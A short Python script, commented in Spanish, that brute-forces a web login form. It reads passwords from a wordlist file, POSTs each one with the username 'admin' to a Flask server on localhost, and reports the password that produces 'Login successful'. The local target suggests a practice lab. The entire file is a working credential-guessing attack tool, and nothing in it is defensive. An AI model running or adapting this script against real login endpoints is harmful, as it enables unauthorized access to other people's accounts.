import requests

# URL del servidor Flask
URL = 'http://127.0.0.1:5000/'

# Ruta al archivo de contraseñas
PASSWORD_FILE = "../probable.txt"


def brute_force():
    with open(PASSWORD_FILE, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Elimina los saltos de línea y espacios extras
        print(f"[-] Fallo con: {password}")

        # Realizar la solicitud POST con la contraseña actual
        response = requests.post(URL, data={
            'username': 'admin',  # Usuario, cambia si es necesario
            'password': password
        })

        # Verificar si la contraseña es correcta
        if response.status_code == 200 and "Login successful" in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            break

if __name__ == "__main__":
    brute_force()
